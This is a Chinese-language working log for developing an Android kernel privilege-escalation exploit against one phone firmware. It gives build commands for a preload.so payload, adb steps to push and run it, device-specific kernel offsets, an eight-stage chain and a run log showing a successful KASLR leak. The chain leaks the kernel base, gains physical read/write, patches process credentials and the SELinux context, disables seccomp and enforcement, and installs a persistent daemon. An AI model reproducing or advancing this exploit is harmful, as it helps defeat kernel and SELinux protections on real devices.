# shennong-root 使用命令

项目根目录：`I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root`

## 1. 编译 preload.so（PROJECT=shennong）

> 注意：shennong 有专属 `src/targets/shennong/slide.c`（legacy words 布局，shennong 6.1 专用），
> 编译时**必须**用该路径替换 `src/slide.c`。

```powershell
cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root"
$clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe"
& $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/shennong/target.h"' src/main.c src/util.c src/targets/shennong/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/shennong/bin/preload.so -pthread
```

产物：`build/shennong/bin/preload.so`

## 2. 编译其他 target（如 blazer）

```powershell
cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root"
$clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe"
& $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/blazer-CP2A.260605.012/target.h"' src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/blazer-CP2A.260605.012/bin/preload.so -pthread
```

## 3. 推送并运行

```powershell
adb push build/shennong/bin/preload.so /data/local/tmp/preload.so
adb shell 'chmod 0644 /data/local/tmp/preload.so'
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/true'
```

## 4. 已验证的 shennong 修复点（2026-08-21）

- `src/targets/shennong/target.h`：FAKE_WAITER_* 为 6.4+ 布局（与 blazer 标准一致）；ASHMEM_*/CONFIGFS_*/COPY_SPLICE_READ/NOOP_LLSEEK/SELINUX_BLOB_SIZES/SECURITY_HOOK_HEADS/KMALLOC_CACHES 已更新为 shennong kallsyms 值
- `src/common.h`：MM_STRUCT_SZ = 0x3c0（shennong sizeof(mm_struct)）
- **新增 `src/targets/shennong/slide.c`**：pselect words 改为 6.1 legacy 布局（tree@0x00/pi_tree@0x18/task@0x30/lock@0x38/wake+prio@0x40/0x44/deadline@0x48/ww_ctx@0x50），修复 shennong 6.1 legacy 内核下栈上 fake waiter 错位导致的 slide child panic
- 其他 target（blazer 等）仍用共享 `src/slide.c`（6.4+ words），不受影响
- 若仍崩在 slide child：用 `dmesg -w` 抓内核 panic 栈定位

## 5. SLIDE_LOGGERS_0_1_OFF 槽位修正（2026-08-21）

- **症状**：slide 走 pselect 路由不 panic，但 `bad leaked pointer=7143b9bf1b12b3d4`（非 0xffff 内核指针），KASLR 泄露失败
- **LOGGERS 槽位修正**：`0x01fe2918` → `0x01fe2920`（loggers[0][1]=ULOG 槽，原值是 LOG 槽运行时为NULL）。语义正确已保留，但**实测证明不是泄露失败根因**
- BUILD_VARIANT_LABEL / BUILD_FINGERPRINT 顺带更正为 shennong_OS3.0.307.0.WNBCNXM

## 6. 真实根因定位（2026-08-21，实测后更正）

- **关键证据**：`7143b9bf1b12b3d4` = boot_id 原始 UUID `d4b3121b-bfb9-4371-...` 前8字节的解析值。即 slide 读到的是**未被打写的原始 boot_id**
- **所有 shift 同值**：attempt1(shift=3)、attempt11(shift=-1)、attempt12(shift=-2) 全读到同一 `7143b9bf1b12b3d4`。若 shift 错导致覆盖位置偏会读不同垃圾值；全读原始值说明**PI 链对 fake waiter pi_tree_entry.rb_left 目标的写入从未触发**，与 shift 无关
- **排除 PSELECT_WAITER_WORD_SHIFT**：shift=3 非 root cause（虽仍是待核实项，但不是当前失败原因）
- **待排查方向**：
  1. waiter 在 pselect 时是否仍挂在 pi_target 树（FUTEX_WAIT_REQUEUE_PI 返回 EAGAIN 后 cleanup 可能已移除 waiter，导致后续 PI 重算不涉及它）
  2. consumer 的 `sched_setattr(SCHED_BATCH+nice)` 对非 RT 任务不触发 rt_mutex PI 传播，可能不是触发写入的机制
  3. shennong slide.c 相对参考版（CVE-2026-43499-Poc-Analysis/source/src/slide.c）的改动：固定 nice=19 vs 动态(calls%19)+1、legacy 11-word vs 6.4+ 13-word、consumer 去掉 tgkill 存活检查
- **设备限制**：无 root，/proc/kallsyms 与 /sys/kernel/btf/vmlinux 不可读，无法用 generate_target.py 算法；/proc/config.gz 可读
- 其他 SLIDE_* 偏移经 IDA 核对正确：NFULNL_LOGGER@0x01fe29c8、RANDOM_BOOT_ID_DATA@0x02107448（指向 sysctl_bootid 的 .data 槽，entry mode=0o444）、SYSCTL_BOOTID@0x0224a458

## 7. 整个提权流程与当前进度（2026-08-21）

### 完整流程链（源码 `run_exploit` main.c:178 + `do_pselect_fake_lock_route` fops.c:88 + fops.c:284）

```
[第1步] KASLR 泄露
  ├─ 优先 perf_event_open 泄露 text_base（main.c:197 perf_leak_text_base）
  └─ 失败则 slide 子路径（main.c:205 slide_leak_kernel_base）
       └─ slide 走 pselect 路由，靠 PI 链写 boot_id 区读 nfulnl_logger 指针

[第2步] 准备 FOPS payload kernel page（main.c:211 prepare_good_kernel_page(PAGE_PAYLOAD_FOPS)）

[第3步] main route 线程组（main.c:213 run_main_route_threads）
  ├─ waiter 线程：lock pi_chain → FUTEX_WAIT_REQUEUE_PI 等 pi_target → do_pselect_fake_lock_route
  ├─ owner 线程：lock pi_target → lock pi_chain（阻塞，制造 PI 链）
  └─ consumer 线程：sched_setattr 触发 PI 重算
  └─ 主线程发 FUTEX_CMP_REQUEUE_PI 把 waiter requeue 到 pi_target

[第4步] do_pselect_fake_lock_route（fops.c:88）
  └─ pselect 栈覆盖 fake_lock → 触发内核用 fake fops 表 → 拿到可控 fd

[第5步] install_pipe_physrw(fd)（fops.c:284）
  └─ 通过 fake fops 建立 pipe 物理读写原语（physrw_read_ok/write_ok/read64_ok/write64_ok）

[第6步] install_android_root(fd)（fops.c:284 → root.c:289）
  ├─ find_task_by_tgid 定位当前 task
  ├─ patch_cred_identity 改 uid/gid/caps
  ├─ patch_cred_sid 改 SELinux sid
  ├─ patch_cred_object / patch_task_seccomp 关 seccomp
  └─ cfi_stage_done=1（fops.c:416）

[第7步] spawn_root_child 验证（root.c:39）
  ├─ fork 子进程 setgid(0)/setuid(0)/setenforce(0)
  └─ root_child_done=1

[第8步] install_embedded_ksud（preload.c:96）
  └─ 写 /data/local/tmp/ksud 并启动 daemon（提权后持久化）
```

### 当前进度：卡在第 1 步 KASLR 泄露

| 步骤 | 状态 | 说明 |
|------|------|------|
| 1. KASLR 泄露 | ❌ **卡住** | perf 路径 EACCES(errno=13，shell 无 perf 权限)；slide 路径读到原始 boot_id，PI 链写入未触发 |
| 2. FOPS payload page | ⬜ 未到 | 依赖第1步 |
| 3. main route 线程 | ⬜ 未到 | 依赖第1步 |
| 4. pselect fake_lock route | ⬜ 未到 | 依赖第1步 |
| 5. pipe 物理读写 | ⬜ 未到 | 依赖第1步 |
| 6. install_android_root | ⬜ 未到 | 依赖第1步 |
| 7. root child 验证 | ⬜ 未到 | 依赖第1步 |
| 8. ksud daemon | ⬜ 未到 | 依赖第1步 |

### 第 1 步卡住的两个子路径

**perf 子路径**：`perf_event_open` 返回 EACCES(13)——shell 上下文 `u:r:shell:s0` 无 `perf_event_open` 权限，此路径在 shennong 上不可用。

**slide 子路径**（当前重点）：日志 `bad leaked pointer=7143b9bf1b12b3d4` = 原始 boot_id UUID 前 8 字节。IDA 逆向确认根因：waiter 走 `futex_wait_requeue_pi` 的 `Q_REQUEUE_PI_IGNORE`(v17==1) 分支返回 EAGAIN，**只 plist_del 删 futex 等待队列，未调 `rt_mutex_wait_proxy_lock`**，waiter 从未进入 pi_target 的 rt_mutex waiters 树，所以 PI 链无活节点可操作，boot_id 区从未被写入。slide 机制前提（waiter 停在树上被 PI 链操作 pi_tree_entry.rb_left）在 shennong 6.1 + 当前触发时序下不成立。

### 已排除的修复尝试（均经实测）
- SLIDE_LOGGERS_0_1_OFF 槽位（LOG→ULOG）：语义正确，非根因
- PSELECT_WAITER_WORD_SHIFT（所有 shift 同值证明无关）
- consumer SCHED_FIFO+50（RT 优先级成功生效仍无效，证明断点不在 consumer 触发）

### 下一步方向
slide 的 pselect 路由在 6.1 上需重新设计触发路径让 waiter 进入 v17==4（rt_mutex_wait_proxy_lock）分支，而非当前 v17==1（IGNORE/EAGAIN）。这不是改偏移/参数能解决，属机制层重新设计。或换其他 KASLR 泄露原语。

### 实验性代码改动（已编译验证，证实均非根因，保留供参考）
- `src/util.c` + `src/targets/shennong/util.c`：加 `sched_setattr_tid_rt`（SCHED_FIFO+priority）
- `src/common.h`：声明 `sched_setattr_tid_rt`
- `src/targets/shennong/slide.c`：consumer 改用 rt50（EPERM 时 fallback nice=19）
- `src/targets/shennong/target.h`：`SLIDE_LOGGERS_0_1_OFF` 0x01fe2918→0x01fe2920（ULOG 槽），BUILD 标签→shennong 307



cd "I:\云盘缓存\down\shennong-ota_full-OS3.0.307.0.WNBCNXM-user-16.0-5bcfc9ad5d\output\shennong-root"; $clang = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\clang.exe"; & $clang --target=aarch64-linux-android35 -fPIC -O2 -g0 -Wall -Wextra -Isrc -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function '-DTARGET_CONFIG_H="targets/shennong/target.h"' src/main.c src/util.c src/targets/shennong/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/ksud_blob.S -shared -o build/shennong/bin/preload.so -pthread 2>&1 | Select-Object -First 40; if (Test-Path build/shennong/bin/preload.so) { Get-FileHash build/shennong/bin/preload.so -Algorithm SHA256 | Format-List; Get-Item build/shennong/bin/preload.so | Select-Object Length, LastWriteTime }


https://github.com/1ndevelopment/CVE-2026-43499-S26

第 1 关打通了！ 交叉验证完美：

worker_thread caller = 0xffffffd06fcda4ac，锚点 0xffffffc0080da4ac

rcu caller = 0xffffffd06fd67b44，锚点 0xffffffc008167b44

两者推出同一个 slide = 0x1067C00000（68GB 级、精确 2MB 对齐）✓

这台设备的 KASLR slide 巨大——这也彻底解释了为什么 pselect/boot_id 路线总是失败：W1 写目标的"slide 修正"完全落在不可预测的页上。tracefs 路线零漏洞、零 panic 风险。现在把它写进 slide.c 作为主路线。




结论:39-bit VA 布局实锤,linear map PAGE_OFFSET = 0xffffff8000000000(16GB 窗口)。而 target.h 的 P0_PAGE_OFFSET = 0xffffff8080000000 是 48-bit 语义的值,错了 512GB。现在验证 fake page 地址来源和 EDEADLK 历史,确认完整因果链。

git stash
git checkout ed1af3a -- .



https://github.com/MakeDecisionWorth/Root-My-Galaxy-Payloads/tree/main
https://github.com/MakeDecisionWorth/Root-My-Galaxy-Payloads/blob/main/src/targets/xperia1vi-jp-69.2.A.4.24/target.h




PS C:\Users\Administrator> adb shell "SLIDE_OWNER_CHAIN_DELAY_USEC=0 SLIDE_REQUEUE_DELAY_USEC=50000 SLIDE_WAIT_NSEC=1000000000 SLIDE_ONLY=1 LD_PRELOAD=/data/local/tmp/preload.so id"
[20:19:45] [+] preload starting pid=10163
[20:19:45] [+] startup context pid=10163 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[20:19:45] [+] build config pid=10163 label=shennong_OS3.0.307.0.WNBCNXM_16.0 p0_active=truephone slide=pselect main=pselect
[20:19:45] [+] p0 profile pid=10163 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029fe29c8 bootid_data=ffffff802a24a458 init_task=ffffff8029fef600 root_tg=ffffff802a1d7580 sysctl_bootid=ffffff802a24a458
[20:19:45] [-] perf_leak: perf_event_open failed errno=13
[20:19:45] [*] prepare_kernel_page geom mode=1 standalone_tcp=1 main_tcp=0 mm_struct_sz=1024 objs_per_slab=32 collisions=8
[20:19:59] [*] prepare_kernel_page leaked_mm=ffffff8904362400 base=ffffff8904360000 mode=1
[20:19:59] [*] fake payload mode=1 write_shape=0 standalone_tcp=1 main_tcp=0 delta=0 bias=e80 lock=ffffff8904361350 w0=ffffff8904362220 task=ffffff8904365800 task_off=5800 fops_off=1000 lock_top_delta=0 write_parent=ffffff8029fe2930 write_right=0000000000000000 write_left=ffffff802a24a458
[20:19:59] [*] sk_buff pcp send 1/1 ret=65536 errno=0
[20:19:59] [*] sk_buff reclaim send 1/4 ret=65536 errno=0
[20:19:59] [*] sk_buff reclaim send 2/4 ret=65536 errno=0
[20:19:59] [*] sk_buff reclaim send 3/4 ret=65536 errno=0
[20:19:59] [*] sk_buff reclaim send 4/4 ret=65536 errno=0
[20:20:00] [*] slide attempt 1/20 uses pselect shift=1
[20:20:00] [+] slide child context route=pselect pid=15553 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[20:20:00] [*] slide consumer knobs core=1 consume_usec=0 consume_delay=2000 enter_delay=50000
[20:20:00] [*] slide EDEADLK detected — activating fast path (pi_blocked_on dangling)
[20:20:01] [*] slide waiter EDEADLK fast path — stack copying now (unlock deferred)
[20:20:01] [*] slide tcp enter page=ffffff8904360000 fake_lock=ffffff8904361350 fake_w0=ffffff8904362220 fake_task=ffffff8904365800
[20:20:01] [*] slide tcp pair client=7 server=8
[20:20:01] [*] slide tcp punch fd=6 page_size=4096 len=16777216
[20:20:01] [*] slide tcp punch map=0x7b6060e000
[20:20:01] [*] slide tcp knobs attempts=2000 arm_seq=16 post_hold=20000
[20:20:02] [*] slide consumer sched tid=15554 nice=1 alive_ret=0 alive_errno=0 sched_ret=0 sched_errno=0
[20:20:02] [*] slide tcp seq=16 ret=0 errno=0 len=64 calls=1 sched_ok=0 last_sched_ret=-1 last_sched_errno=0
[20:20:02] [*] slide tcp side effect calls=1 sched_ok=1
[20:20:02] [*] slide EDEADLK fast path: stack copy done, reading stext
[20:20:02] [+] slide boot_id_leaked_nfulnl_logger pid=15553 value=ffffff8029fe2930 stext=ffffff8027ffff68
[20:20:02] [+] slide boot_id-derived_stext pid=15553 value=ffffff8027ffff68
[20:20:02] [*] slide EDEADLK deferred unlock_chain ret=0 errno=0
[20:20:02] [*] slide EDEADLK cleanup done (dangling pi_blocked_on cleared)
[20:20:02] [+] slide-kaslr-ok pid=10163 base=ffffff8027ffff68 slide=ffffffc01fffff68
[20:20:02] [+] slide-only done base=ffffff8027ffff68 slide=ffffffc01fffff68
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
